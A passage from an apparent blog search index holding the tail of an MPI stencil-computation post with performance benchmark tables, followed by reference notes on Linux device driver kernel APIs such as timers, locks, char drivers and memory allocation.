/*sendtag=*/kYPred, /*recvbuf=*/&amp;a0[INDEX(0, y_start - 1, 0, ldx, ldy)], /*recvcount=*/1, /*recvtype=*/XZ_PLANE, /*source=*/pid[kYPred], /*recvtag=*/kYSucc, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); } if (block_size[kYSucc]) { MPI_Sendrecv(/*sendbuf=*/&amp;a0[INDEX(0, y_end - 1, 0, ldx, ldy)], /*sendcount=*/1, /*sendtype=*/XZ_PLANE, /*dest=*/pid[kYSucc], /*sendtag=*/kYSucc, /*recvbuf=*/&amp;a0[INDEX(0, y_end, 0, ldx, ldy)], /*recvcount=*/1, /*recvtype=*/XZ_PLANE, /*source=*/pid[kYSucc], /*recvtag=*/kYPred, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); } if (block_size[kZPred]) { MPI_Sendrecv(/*sendbuf=*/&amp;a0[INDEX(0, 0, z_start, ldx, ldy)], /*sendcount=*/1, /*sendtype=*/XY_PLANE, /*dest=*/pid[kZPred], /*sendtag=*/kZPred, /*recvbuf=*/&amp;a0[INDEX(0, 0, z_start - 1, ldx, ldy)], /*recvcount=*/1, /*recvtype=*/XY_PLANE, /*source=*/pid[kZPred], /*recvtag=*/kZSucc, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); } if (block_size[kZSucc]) { MPI_Sendrecv(/*sendbuf=*/&amp;a0[INDEX(0, 0, z_end - 1, ldx, ldy)], /*sendcount=*/1, /*sendtype=*/XY_PLANE, /*dest=*/pid[kZSucc], /*sendtag=*/kZSucc, /*recvbuf=*/&amp;a0[INDEX(0, 0, z_end, ldx, ldy)], /*recvcount=*/1, /*recvtype=*/XY_PLANE, /*source=*/pid[kZSucc], /*recvtag=*/kZPred, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); } for (int z = z_start; z &lt; z_end; ++z) { for (int y = y_start; y &lt; y_end; ++y) {#ifdef INTRINSIC for (int x = x_start; x &lt; x_end / 4 * 4; x += 4) Kernel7(a0, a1, x, y, z, ldx, ldy); for (int x = x_end / 4 * 4; x &lt; x_end; ++x) {#else for (int x = x_start; x &lt; x_end; ++x) {#endif a1[INDEX(x, y, z, ldx, ldy)] = ALPHA_ZZZ * a0[INDEX(x, y, z, ldx, ldy)] + ALPHA_NZZ * a0[INDEX(x - 1, y, z, ldx, ldy)] + ALPHA_PZZ * a0[INDEX(x + 1, y, z, ldx, ldy)] + ALPHA_ZNZ * a0[INDEX(x, y - 1, z, ldx, ldy)] + ALPHA_ZPZ * a0[INDEX(x, y + 1, z, ldx, ldy)] + ALPHA_ZZN * a0[INDEX(x, y, z - 1, ldx, ldy)] + ALPHA_ZZP * a0[INDEX(x, y, z + 1, ldx, ldy)]; } } } } return buffer[nt % 2];}MPI Performance Threads Computation Time (s) Performance (Gflop/s) Speedup / Single Thread Speedup / Naive Single Thread 1 31.195547 5.593204 1. 8.561332290 2 16.056561 10.866776 1.94285351 16.63341446 4 8.557309 20.389943 3.64548531 31.21021108 8 4.688768 37.212980 6.65324919 56.96067717 16 3.599826 48.469855 8.66584788 74.19120326 28 3.494326 49.933255 8.92748682 76.43118122 PerformanceNaiveNo OPT Size Computation Time (s) Performance (Gflop/s) 256 x 256 x 256 1.310379 16.644326 512 x 512 x 512 10.179150 17.141220 768 x 768 x 768 33.206675 17.733793 OPT Size Computation Time (s) Performance (Gflop/s) Speedup / Naive 256 x 256 x 256 1.042685 20.917516 1.25673554 512 x 512 x 512 6.357943 27.443318 1.60101311 768 x 768 x 768 21.682391 27.159379 1.53150423 OMP2D Cache Blockingstatic const int tx = 256;static const int ty = 16; Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.656014 33.246826 1.99748707 1.58942515 512 x 512 x 512 4.403168 39.626707 2.31177868 1.44394738 768 x 768 x 768 15.625801 37.686406 2.12511819 1.38760190 Cache Obliviousstatic const int kCutoff = (1 &lt;&lt; 20);static const int ds = 1; Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.290660 75.037455 4.50829039 3.58730238 512 x 512 x 512 5.862571 29.762205 1.73629444 1.08449733 768 x 768 x 768 17.230060 34.177494 1.92725234 1.25840484 Time Skewingconst int tx = x_end - x_start;const int ty = 32;const int tz = 64; Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.244840 89.080177 5.35198463 4.25864032 512 x 512 x 512 3.916044 44.555941 2.59934480 1.62356246 768 x 768 x 768 11.524923 51.096243 2.88129240 1.88134799 Circular Queue Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 1.461332 14.925003 0.89670216 0.71351699 512 x 512 x 512 12.507371 13.950418 0.81385211 0.50833569 768 x 768 x 768 40.458871 14.555035 0.82075138 0.53591192 Auto SIMD Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.728613 29.934117 1.79845774 1.43105505 512 x 512 x 512 5.759591 30.294345 1.76733891 1.10388784 768 x 768 x 768 16.067388 36.650655 2.06671269 1.34946587 Intrinsic Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.715376 30.487998 1.83173521 1.45753435 512 x 512 x 512 5.494364 31.756734 1.85265308 1.15717546 768 x 768 x 768 16.741729 35.174399 1.98346733 1.29511058 Time Skewing + Intrinsicconst int tx = x_end - x_start;const int ty = 16;const int tz = 112; Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.252214 86.475845 5.19551498 4.13413548 512 x 512 x 512 2.525018 69.101709 4.03131802 2.51797939 768 x 768 x 768 8.686356 67.793709 3.82285442 2.49614356 MPIBlocking Communication Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.501527 43.487911 2.61277693 2.07901889 512 x 512 x 512 4.659057 37.450291 2.18480896 1.36464151 768 x 768 x 768 15.672776 37.573451 2.11874871 1.38344294 Non-Blocking Communication Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.490962 44.423804 2.66900588 2.12376097 512 x 512 x 512 4.637739 37.622439 2.19485188 1.37091437 768 x 768 x 768 16.453953 35.789594 2.01815788 1.31776187 3D Blocking Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.377116 57.834689 3.47473902 2.76489278 512 x 512 x 512 3.540040 49.288444 2.87543384 1.79600892 768 x 768 x 768 14.868124 39.606897 2.23341374 1.45831379 3D Blocking + Intrinsic Size Computation Time (s) Performance (Gflop/s) Speedup / Naive Speedup / Naive OPT 256 x 256 x 256 0.400361 54.476819 3.27299640 2.60436368 512 x 512 x 512 3.460323 50.423912 2.94167580 1.83738395 768 x 768 x 768 14.525021 40.542475 2.28617053 1.49276149 " }, { "title": "Linux Device Drivers | Time, Delays, and Deferred Work", "url": "/linux/2022/05/13/linux-device-drivers-time-delays-and-deferred-work/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, Linux Device Drivers", "date": "2022-05-13 00:00:00 +0800", "snippet": "Timekeeping&lt;linux/param.h&gt;HZThe HZ symbol specifies the number of clock ticks generated per second.&lt;linux/jiffies.h&gt;volatile unsigned long jiffiesu64 jiffies_64The jiffies_64 variable is incremented once for each clock tick; thus, it's incremented HZ times per second. Kernel code most often refers to jiffies, which is the same as jiffies_64 on 64-bit platforms and the least significant half of it on 32-bit platforms.int time_after(unsigned long a, unsigned long b);int time_before(unsigned long a, unsigned long b);int time_after_eq(unsigned long a, unsigned long b);int time_before_eq(unsigned long a, unsigned long b);These Boolean expressions compare jiffies in a safe way, without problems in case of counter overflow and without the need to access jiffies_64.u64 get_jiffies_64(void);Retrieves jiffies_64 without race conditions.&lt;linux/time.h&gt;unsigned long timespec_to_jiffies(struct timespec *value);void jiffies_to_timespec(unsigned long jiffies, struct timespec *value);unsigned long timeval_to_jiffies(struct timeval *value);void jiffies_to_timeval(unsigned long jiffies, struct timeval *value);Converts time representations between jiffies and other representations.&lt;asm/msr.h&gt;rdtsc(low32,high32);rdtscl(low32);rdtscll(var64);x86-specific macros to read the timestamp counter. They read it as two 32-bit halves, read only the lower half, or read all of it into a long long variable.&lt;linux/timex.h&gt;cycles_t get_cycles(void);Returns the timestamp counter in a platform-independent way. If the CPU offers no timestamp feature, 0 is returned.&lt;linux/time.h&gt;unsigned long mktime(year, mon, day, h, m, s);Returns the number of seconds since the Epoch, based on the six unsigned int arguments.void do_gettimeofday(struct timeval *tv);Returns the current time, as seconds and microseconds since the Epoch, with the best resolution the hardware can offer. On most platforms the resolution is one microsecond or better, although some platforms offer only jiffies resolution.struct timespec current_kernel_time(void);Returns the current time with the resolution of one jiffy.Delays&lt;linux/wait.h&gt;long wait_event_interruptible_timeout(wait_queue_head_t *q, condition, signed long timeout);Puts the current process to sleep on the wait queue, installing a timeout value expressed in jiffies. Use schedule_timeout (below) for non-interruptible sleeps.&lt;linux/sched.h&gt;signed long schedule_timeout(signed long timeout);Calls the scheduler after ensuring that the current process is awakened at timeout expiration. The caller must invoke set_current_state first to put itself in an interruptible or non-interruptible sleep state.&lt;linux/delay.h&gt;void ndelay(unsigned long nsecs);void udelay(unsigned long usecs);void mdelay(unsigned long msecs);Introduces delays of an integer number of nanoseconds, microseconds, and milliseconds. The delay achieved is at least the requested value, but it can be more. The argument to each function must not exceed a platform-specific limit (usually a few thousands).void msleep(unsigned int millisecs);unsigned long msleep_interruptible(unsigned int millisecs);void ssleep(unsigned int seconds);Puts the process to sleep for the given number of milliseconds (or seconds, in the case of ssleep).Kernel Timers&lt;asm/hardirq.h&gt;int in_interrupt(void);int in_atomic(void);Returns a Boolean value telling whether the calling code is executing in interrupt context or atomic context. Interrupt context is outside of a process context, either during hardware or software interrupt processing. Atomic context is when you can't schedule either an interrupt context or a process's context with a spinlock held.&lt;linux/timer.h&gt;void init_timer(struct timer_list * timer);struct timer_list TIMER_INITIALIZER(_function, _expires, _data);This function and the static declaration of the timer structure are the two ways to initialize a timer_list data structure.void add_timer(struct timer_list * timer);Registers the timer structure to run on the current CPU.int mod_timer(struct timer_list *timer, unsigned long expires);Changes the expiration time of an already scheduled timer structure. It can also act as an alternative to add_timer.int timer_pending(struct timer_list * timer);Macro that returns a Boolean value stating whether the timer structure is already registered to run.void del_timer(struct timer_list * timer);void del_timer_sync(struct timer_list * timer);Removes a timer from the list of active timers. The latter function ensures that the timer is not currently running on another CPU.Tasklets&lt;linux/interrupt.h&gt;DECLARE_TASKLET(name, func, data);DECLARE_TASKLET_DISABLED(name, func, data);void tasklet_init(struct tasklet_struct *t, void (*func)(unsigned long), unsigned long data);The first two macros declare a tasklet structure, while the tasklet_init function initializes a tasklet structure that has been obtained by allocation or other means. The second DECLARE macro marks the tasklet as disabled.void tasklet_disable(struct tasklet_struct *t);void tasklet_disable_nosync(struct tasklet_struct *t);void tasklet_enable(struct tasklet_struct *t);Disables and reenables a tasklet. Each disable must be matched with an enable (you can disable the tasklet even if it's already disabled). The function tasklet_disable waits for the tasklet to terminate if it is running on another CPU. The nosync version doesn't take this extra step.void tasklet_schedule(struct tasklet_struct *t);void tasklet_hi_schedule(struct tasklet_struct *t);Schedules a tasklet to run, either as a \"normal\" tasklet or a high-priority one. When soft interrupts are executed, high-priority tasklets are dealt with first, while normal tasklets run last.void tasklet_kill(struct tasklet_struct *t);Removes the tasklet from the list of active ones, if it's scheduled to run. Like tasklet_disable, the function may block on SMP systems waiting for the tasklet to terminate if it's currently running on another CPU.Workqueues&lt;linux/workqueue.h&gt;struct workqueue_struct;struct work_struct;The structures representing a workqueue and a work entry, respectively.struct workqueue_struct *create_workqueue(const char *name);struct workqueue_struct *create_singlethread_workqueue(const char *name);void destroy_workqueue(struct workqueue_struct *queue);Functions for creating and destroying workqueues. A call to create_workqueue creates a queue with a worker thread on each processor in the system; instead, create_singlethread_workqueue creates a workqueue with a single worker process.DECLARE_WORK(name, void (*function)(void *), void *data);INIT_WORK(struct work_struct *work, void (*function)(void *), void *data);PREPARE_WORK(struct work_struct *work, void (*function)(void *), void *data);Macros that declare and initialize workqueue entries.int queue_work(struct workqueue_struct *queue, struct work_struct *work);int queue_delayed_work(struct workqueue_struct *queue, struct work_struct *work, unsigned long delay);Functions that queue work for execution from a workqueue.int cancel_delayed_work(struct work_struct *work);void flush_workqueue(struct workqueue_struct *queue);Use cancel_delayed_work to remove an entry from a workqueue; flush_workqueue ensures that no workqueue entries are running anywhere in the system.int schedule_work(struct work_struct *work);int schedule_delayed_work(struct work_struct *work, unsigned long delay);void flush_scheduled_work(void);Functions for working with the shared workqueue." }, { "title": "Linux Device Drivers | Concurrency and Race Conditions", "url": "/linux/2022/05/13/linux-device-drivers-concurrency-and-race-conditions/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, Linux Device Drivers", "date": "2022-05-13 00:00:00 +0800", "snippet": "&lt;asm/semaphore.h&gt; (not found)The include file that defines semaphores and the operations on them.DECLARE_MUTEX(name);DECLARE_MUTEX_LOCKED(name);Two macros for declaring and initializing a semaphore used in mutual exclusion mode.void init_MUTEX(struct semaphore *sem);void init_MUTEX_LOCKED(struct semaphore *sem);These two functions can be used to initialize a semaphore at runtime.void down(struct semaphore *sem);int down_interruptible(struct semaphore *sem);int down_trylock(struct semaphore *sem);void up(struct semaphore *sem);Lock and unlock a semaphore. down puts the calling process into an uninterruptible sleep if need be; down_interruptible, instead, can be interrupted by a signal. down_trylock does not sleep; instead, it returns immediately if the semaphore is unavailable. Code that locks a semaphore must eventually unlock it with up.struct rw_semaphore;init_rwsem(struct rw_semaphore *sem);The reader/writer version of semaphores and the function that initializes it.void down_read(struct rw_semaphore *sem);int down_read_trylock(struct rw_semaphore *sem);void up_read(struct rw_semaphore *sem);Functions for obtaining and releasing read access to a reader/writer semaphore.void down_write(struct rw_semaphore *sem)int down_write_trylock(struct rw_semaphore *sem)void up_write(struct rw_semaphore *sem)void downgrade_write(struct rw_semaphore *sem)Functions for managing write access to a reader/writer semaphore.&lt;linux/completion.h&gt;DECLARE_COMPLETION(name);init_completion(struct completion *c);INIT_COMPLETION(struct completion c);The include file describing the Linux completion mechanism, and the normal methods for initializing completions. INIT_COMPLETION should be used only to reinitialize a completion that has been previously used.void wait_for_completion(struct completion *c);Wait for a completion event to be signaled.void complete(struct completion *c);void complete_all(struct completion *c);Signal a completion event. complete wakes, at most, one waiting thread, while complete_all wakes all waiters.void complete_and_exit(struct completion *c, long retval);Signals a completion event by calling complete and calls exit for the current thread.&lt;linux/spinlock.h&gt;spinlock_t lock = SPIN_LOCK_UNLOCKED;spin_lock_init(spinlock_t *lock);The include file defining the spinlock interface and the two ways of initializing locks.void spin_lock(spinlock_t *lock);void spin_lock_irqsave(spinlock_t *lock, unsigned long flags);void spin_lock_irq(spinlock_t *lock);void spin_lock_bh(spinlock_t *lock);The various ways of locking a spinlock and, possibly, disabling interrupts.int spin_trylock(spinlock_t *lock);int spin_trylock_bh(spinlock_t *lock);Non-spinning versions of the above functions; these return 0 in case of failure to obtain the lock, nonzero otherwise.void spin_unlock(spinlock_t *lock);void spin_unlock_irqrestore(spinlock_t *lock, unsigned long flags);void spin_unlock_irq(spinlock_t *lock);void spin_unlock_bh(spinlock_t *lock);The corresponding ways of releasing a spinlock.rwlock_t lock = RW_LOCK_UNLOCKED;rwlock_init(rwlock_t *lock);The two ways of initializing reader/writer locks.void read_lock(rwlock_t *lock);void read_lock_irqsave(rwlock_t *lock, unsigned long flags);void read_lock_irq(rwlock_t *lock);void read_lock_bh(rwlock_t *lock);Functions for obtaining read access to a reader/writer lock.void read_unlock(rwlock_t *lock);void read_unlock_irqrestore(rwlock_t *lock, unsigned long flags);void read_unlock_irq(rwlock_t *lock);void read_unlock_bh(rwlock_t *lock);Functions for releasing read access to a reader/writer spinlock.void write_lock(rwlock_t *lock);void write_lock_irqsave(rwlock_t *lock, unsigned long flags);void write_lock_irq(rwlock_t *lock);void write_lock_bh(rwlock_t *lock);Functions for obtaining write access to a reader/writer lock.void write_unlock(rwlock_t *lock);void write_unlock_irqrestore(rwlock_t *lock, unsigned long flags);void write_unlock_irq(rwlock_t *lock);void write_unlock_bh(rwlock_t *lock);Functions for releasing write access to a reader/writer spinlock.&lt;linux/rwsem.h&gt;struct rw_semaphore;init_rwsem(struct rw_semaphore *sem);The reader/writer version of semaphores and the function that initializes it.void down_read(struct rw_semaphore *sem);int down_read_trylock(struct rw_semaphore *sem);void up_read(struct rw_semaphore *sem);Functions for obtaining and releasing read access to a reader/writer semaphore.void down_write(struct rw_semaphore *sem)int down_write_trylock(struct rw_semaphore *sem)void up_write(struct rw_semaphore *sem)void downgrade_write(struct rw_semaphore *sem)Functions for managing write access to a reader/writer semaphore." }, { "title": "Linux Device Drivers | Char Drivers", "url": "/linux/2022/05/13/linux-device-drivers-char-drivers/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, Linux Device Drivers", "date": "2022-05-13 00:00:00 +0800", "snippet": "&lt;linux/types.h&gt;dev_tdev_t is the type used to represent device numbers within the kernel.int MAJOR(dev_t dev);int MINOR(dev_t dev);Macros that extract the major and minor numbers from a device number.dev_t MKDEV(unsigned int major, unsigned int minor);Macro that builds a dev_t data item from the major and minor numbers.&lt;linux/fs.h&gt;The \"filesystem\" header is the header required for writing device drivers. Many important functions and data structures are declared in here.int register_chrdev_region(dev_t first, unsigned int count, char *name)int alloc_chrdev_region(dev_t *dev, unsigned int firstminor, unsigned int count, char *name)void unregister_chrdev_region(dev_t first, unsigned int count);Functions that allow a driver to allocate and free ranges of device numbers. register_chrdev_region should be used when the desired major number is known in advance; for dynamic allocation, use alloc_chrdev_region instead.int register_chrdev(unsigned int major, const char *name, struct file_operations *fops);The old (pre-2.6) char device registration routine. It is emulated in the 2.6 kernel but should not be used for new code. If the major number is not 0, it is used unchanged; otherwise a dynamic number is assigned for this device.int unregister_chrdev(unsigned int major, const char *name);Function that undoes a registration made with register_chrdev. Both major and the name string must contain the same values that were used to register the driver.struct file_operations;struct file;struct inode;Three important data structures used by most device drivers. The file_operations structure holds a char driver's methods; struct file represents an open file, and struct inode represents a file on disk.&lt;linux/cdev.h&gt;struct cdev *cdev_alloc(void);void cdev_init(struct cdev *dev, struct file_operations *fops);int cdev_add(struct cdev *dev, dev_t num, unsigned int count);void cdev_del(struct cdev *dev);Functions for the management of cdev structures, which represent char devices within the kernel.&lt;linux/kernel.h&gt;container_of(pointer, type, field);A convenience macro that may be used to obtain a pointer to a structure from a pointer to some other structure contained within it.&lt;asm/uaccess.h&gt;This include file declares functions used by kernel code to move data to and from user space.unsigned long copy_from_user (void *to, const void *from, unsigned long count);unsigned long copy_to_user (void *to, const void *from, unsigned long count);Copy data between user space and kernel space." }, { "title": "Linux Device Drivers | Char Drivers | The file Structure", "url": "/linux/2022/05/13/linux-device-drivers-char-drivers-the-file-structure/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, Linux Device Drivers, Char Drivers", "date": "2022-05-13 00:00:00 +0800", "snippet": "#include &lt;linux/fs.h&gt;struct file { ... };f_modemode_t f_mode;The file mode identifies the file as either readable or writable (or both), by means of the bits FMODE_READ and FMODE_WRITE. You might want to check this field for read/write permission in your open or ioctl function, but you don’t need to check permissions for read and write, because the kernel checks before invoking your method. An attempt to read or write when the file has not been opened for that type of access is rejected without the driver even knowing about it.f_posloff_t f_pos;The current reading or writing position. loff_t is a 64-bit value on all platforms (long long in gcc terminology). The driver can read this value if it needs to know the current position in the file but should not normally change it; read and write should update a position using the pointer they receive as the last argument instead of acting on filp-&gt;f_pos directly. The one exception to this rule is in the llseek method, the purpose of which is to change the file position.f_flagsunsigned int f_flags;These are the file flags, such as O_RDONLY, O_NONBLOCK, and O_SYNC. A driver should check the O_NONBLOCK flag to see if nonblocking operation has been requested (we discuss nonblocking I/O in the section \"Blocking and Nonblocking Operations\" in Chapter 6); the other flags are seldom used. In particular, read/write permission should be checked using f_mode rather than f_flags. All the flags are defined in the header &lt;linux/fcntl.h&gt;.f_opstruct file_operations *f_op;The operations associated with the file. The kernel assigns the pointer as part of its implementation of open and then reads it when it needs to dispatch any operations. The value in filp-&gt;f_op is never saved by the kernel for later reference; this means that you can change the file operations associated with your file, and the new methods will be effective after you return to the caller. For example, the code for open associated with major number 1 (/dev/null, /dev/zero, and so on) substitutes the operations in filp-&gt;f_op depending on the minor number being opened. This practice allows the implementation of several behaviors under the same major number without introducing overhead at each system call. The ability to replace the file operations is the kernel equivalent of \"method overriding\" in object-oriented programming.private_datavoid *private_data;The open system call sets this pointer to NULL before calling the open method for the driver. You are free to make its own use of the field or to ignore it; you can use the field to point to allocated data, but then you must remember to free that memory in the release method before the file structure is destroyed by the kernel. private_data is a useful resource for preserving state information across system calls and is used by most of our sample modules.f_dentrystruct dentry *f_dentry;The directory entry (dentry) structure associated with the file. Device driver writers normally need not concern themselves with dentry structures, other than to access the inode structure as filp-&gt;f_dentry-&gt;d_inode." }, { "title": "Linux Device Drivers | Char Drivers | File Operations", "url": "/linux/2022/05/13/linux-device-drivers-char-drivers-file-operations/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, Linux Device Drivers, Char Drivers", "date": "2022-05-13 00:00:00 +0800", "snippet": "#include &lt;linux/fs.h&gt;struct file_operations { ... };ownerstruct module *ownerThe first file_operations field is not an operation at all; it is a pointer to the module that \"owns\" the structure. This field is used to prevent the module from being unloaded while its operations are in use. Almost all the time, it is simply initialized to THIS_MODULE, a macro defined in &lt;linux/module.h&gt;.llseekloff_t (*llseek) (struct file *, loff_t, int);The llseek method is used to change the current read/write position in a file, and the new position is returned as a (positive) return value. The loff_t parameter is a \"long offset\" and is at least 64 bits wide even on 32-bit platforms. Errors are signaled by a negative return value. If this function pointer is NULL, seek calls will modify the position counter in the file structure (described in the section \"The file Structure\") in potentially unpredictable ways.readssize_t (*read) (struct file *, char __user *, size_t, loff_t *);Used to retrieve data from the device. A null pointer in this position causes the read system call to fail with -EINVAL (\"Invalid argument\"). A nonnegative return value represents the number of bytes successfully read (the return value is a \"signed size\" type, usually the native integer type for the target platform).aio_readssize_t (*aio_read)(struct kiocb *, char __user *, size_t, loff_t);Initiates an asynchronous read — a read operation that might not complete before the function returns. If this method is NULL, all operations will be processed (synchronously) by read instead.writessize_t (*write) (struct file *, const char __user *, size_t, loff_t *);Sends data to the device. If NULL, -EINVAL is returned to the program calling the write system call. The return value, if nonnegative, represents the number of bytes successfully written.aio_writessize_t (*aio_write) (struct kiocb *, const char __user *, size_t, loff_t *);Initiates an asynchronous write operation on the device.readdirint (*readdir) (struct file *, void *, filldir_t);This field should be NULL for device files; it is used for reading directories and is useful only for filesystems.pollunsigned int (*poll) (struct file *, struct poll_table_struct *);The poll method is the back end of three system calls: poll, epoll, and select, all of which are used to query whether a read or write to one or more file descriptors would block. The poll method should return a bit mask indicating whether nonblocking reads or writes are possible, and, possibly, provide the kernel with information that can be used to put the calling process to sleep until I/O becomes possible. If a driver leaves its poll method NULL, the device is assumed to be both readable and writable without blocking.ioctlint (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);The ioctl system call offers a way to issue device-specific commands (such as formatting a track of a floppy disk, which is neither reading nor writing). Additionally, a few ioctl commands are recognized by the kernel without referring to the fops table. If the device doesn't provide an ioctl method, the system call returns an error for any request that isn't predefined (-ENOTTY, \"No such ioctl for device\").mmapint (*mmap) (struct file *, struct vm_area_struct *);mmap is used to request a mapping of device memory to a process's address space. If this method is NULL, the mmap system call returns -ENODEV.openint (*open) (struct inode *, struct file *);Though this is always the first operation performed on the device file, the driver is not required to declare a corresponding method. If this entry is NULL, opening the device always succeeds, but your driver isn't notified.flushint (*flush) (struct file *);The flush operation is invoked when a process closes its copy of a file descriptor for a device; it should execute (and wait for) any outstanding operations on the device. This must not be confused with the fsync operation requested by user programs. Currently, flush is used in very few drivers; the SCSI tape driver uses it, for example, to ensure that all data written makes it to the tape before the device is closed. If flush is NULL, the kernel simply ignores the user application request.releaseint (*release) (struct inode *, struct file *);This operation is invoked when the file structure is being released. Like open, release can be NULL.[^*]fsyncint (*fsync) (struct file *, struct dentry *, int);This method is the back end of the fsync system call, which a user calls to flush any pending data. If this pointer is NULL, the system call returns -EINVAL.aio_fsyncint (*aio_fsync)(struct kiocb *, int);This is the asynchronous version of the fsync method.fasyncint (*fasync) (int, struct file *, int);This operation is used to notify the device of a change in its FASYNC flag. Asynchronous notification is an advanced topic and is described in Chapter 6. The field can be NULL if the driver doesn't support asynchronous notification.lockint (*lock) (struct file *, int, struct file_lock *);The lock method is used to implement file locking; locking is an indispensable feature for regular files but is almost never implemented by device drivers.readvssize_t (*readv) (struct file *, const struct iovec *, unsigned long, loff_t *);ssize_t (*writev) (struct file *, const struct iovec *, unsigned long, loff_t *);These methods implement scatter/gather read and write operations. Applications occasionally need to do a single read or write operation involving multiple memory areas; these system calls allow them to do so without forcing extra copy operations on the data. If these function pointers are left NULL, the read and write methods are called (perhaps more than once) instead.sendfilessize_t (*sendfile)(struct file *, loff_t *, size_t, read_actor_t, void *);This method implements the read side of the sendfile system call, which moves the data from one file descriptor to another with a minimum of copying. It is used, for example, by a web server that needs to send the contents of a file out a network connection. Device drivers usually leave sendfile NULL.sendpagessize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);sendpage is the other half of sendfile; it is called by the kernel to send data, one page at a time, to the corresponding file. Device drivers do not usually implement sendpage.get_unmapped_areaunsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);The purpose of this method is to find a suitable location in the process’s address space to map in a memory segment on the underlying device. This task is normally performed by the memory management code; this method exists to allow drivers to enforce any alignment requirements a particular device may have. Most drivers can leave this method NULL.chech_flagsint (*check_flags) (int);This method allows a module to check the flags passed to an fcntl(F_SETFL...) call.dir_notifyint (*dir_notify) (struct file *, unsigned long);This method is invoked when an application uses fcntl to request directory change notifications. It is useful only to filesystems; drivers need not implement dir_notify." }, { "title": "Linux Device Drivers | Building and Running Modules", "url": "/linux/2022/05/13/linux-device-drivers-building-and-running-modules/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, Linux Device Drivers", "date": "2022-05-13 00:00:00 +0800", "snippet": "UtilitiesinsmodmodprobermmodUser-space utilities that load modules into the running kernels and remove them.&lt;linux/init.h&gt;module_init(init_function);module_exit(cleanup_function);Macros that designate a module's initialization and cleanup functions.__init__initdata__exit__exitdataMarkers for functions (__init and __exit) and data (__initdata and __exitdata) that are only used at module initialization or cleanup time. Items marked for initialization may be discarded once initialization completes; the exit items may be discarded if module unloading has not been configured into the kernel. These markers work by causing the relevant objects to be placed in a special ELF section in the executable file.&lt;linux/sched.h&gt;One of the most important header files. This file contains definitions of much of the kernel API used by the driver, including functions for sleeping and numerous variable declarations.struct task_struct *current;The current process.current-&gt;pidcurrent-&gt;commThe process ID and command name for the current process.Makefileobj-mA makefile symbol used by the kernel build system to determine which modules should be built in the current directory.Files/sys/module/proc/modules/sys/module is a sysfs directory hierarchy containing information on currently-loaded modules. /proc/modules is the older, single-file version of that information. Entries contain the module name, the amount of memory each module occupies, and the usage count. Extra strings are appended to each line to specify flags that are currently active for the module.vermagic.oAn object file from the kernel source directory that describes the environment a module was built for.&lt;linux/module.h&gt;Required header. It must be included by a module source.&lt;linux/version.h&gt;A header file containing information on the version of the kernel being built.LINUX_VERSION_CODEInteger macro, useful to #ifdef version dependencies.EXPORT_SYMBOL(symbol);EXPORT_SYMBOL_GPL(symbol);Macro used to export a symbol to the kernel. The second form limits use of the exported symbol to GPL-licensed modules.MODULE_AUTHOR(author);MODULE_DESCRIPTION(description);MODULE_VERSION(version_string);MODULE_DEVICE_TABLE(table_info);MODULE_ALIAS(alternate_name);Place documentation on the module in the object file.MODULE_LICENSE(license);Declare the license governing this module.&lt;linux/moduleparam.h&gt;module_param(variable, type, perm);Macro that creates a module parameter that can be adjusted by the user when the module is loaded (or at boot time for built-in code). The type can be one of bool, charp, int, invbool, long, short, ushort, uint, ulong, or intarray.&lt;linux/kernel.h&gt;int printk(const char * fmt, ...);The analogue of printf for kernel code." }, { "title": "Linux Device Drivers | Allocating Memory", "url": "/linux/2022/05/13/linux-device-drivers-allocating-memory/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, Linux Device Drivers", "date": "2022-05-13 00:00:00 +0800", "snippet": "&lt;linux/slab.h&gt;void *kmalloc(size_t size, int flags);void kfree(void *obj);The most frequently used interface to memory allocation.&lt;linux/mm.h&gt;GFP_USERGFP_KERNELGFP_NOFSGFP_NOIOGFP_ATOMICFlags that control how memory allocations are performed, from the least restrictive to the most. The GFP_USER and GFP_KERNEL priorities allow the current process to be put to sleep to satisfy the request. GFP_NOFS and GFP_NOIO disable filesystem operations and all I/O operations, respectively, while GFP_ATOMIC allocations cannot sleep at all.__GFP_DMA__GFP_HIGHMEM__GFP_COLD__GFP_NOWARN__GFP_HIGH__GFP_REPEAT__GFP_NOFAIL__GFP_NORETRYThese flags modify the kernel's behavior when allocating memory.&lt;linux/malloc.h&gt;kmem_cache_t *kmem_cache_create(char *name, size_t size, size_t offset, unsigned long flags, constructor(), destructor());int kmem_cache_destroy(kmem_cache_t *cache);Create and destroy a slab cache. The cache can be used to allocate several objects of the same size.SLAB_NO_REAPSLAB_HWCACHE_ALIGNSLAB_CACHE_DMAFlags that can be specified while creating a cache.SLAB_CTOR_ATOMICSLAB_CTOR_CONSTRUCTORFlags that the allocator can pass to the constructor and the destructor functions.void *kmem_cache_alloc(kmem_cache_t *cache, int flags);void kmem_cache_free(kmem_cache_t 